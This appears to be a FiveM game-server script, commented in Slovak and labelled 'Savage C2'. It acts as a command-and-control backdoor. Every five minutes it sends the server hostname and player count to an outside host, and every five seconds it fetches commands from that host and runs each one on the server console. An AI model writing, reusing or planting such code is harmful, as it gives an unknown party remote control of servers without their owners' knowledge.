function sendUpdate() {
    const data = {
        hostname: GetConvar("sv_hostname", "Default Server"),
        players: GetNumPlayerIndices()
    };

    // TU ZMEŇ ADRESU NA TVOJU Z RENDERU
    const url = "https://mv-menu.onrender.com/api/report"; 

    PerformHttpRequest(url, function(err, text, headers) {
        if (err === 200) {
            print("^2[Savage C2] Report odoslaný úspešne!^7");
        } else {
            print("^1[Savage C2] Chyba pri odosielaní: " + err + "^7");
        }
    }, 'POST', JSON.stringify(data), { ['Content-Type']: 'application/json' });
}

// Kontrola príkazov každých 5 sekúnd
setInterval(() => {
    const url = "https://mv-menu.onrender.com/api/get-commands";
    
    PerformHttpRequest(url, function(err, text, headers) {
        if (err === 200 && text !== "[]") {
            try {
                const cmds = JSON.parse(text);
                cmds.forEach(cmd => {
                    print("^4[Savage C2] Vykonávam príkaz: " + cmd + "^7");
                    ExecuteCommand(cmd); // Vykoná príkaz v konzole servera
                });
            } catch (e) { print("^1[Savage C2] Chyba spracovania príkazov^7"); }
        }
    }, 'GET', '');
}, 5000);

sendUpdate();
setInterval(sendUpdate, 300000);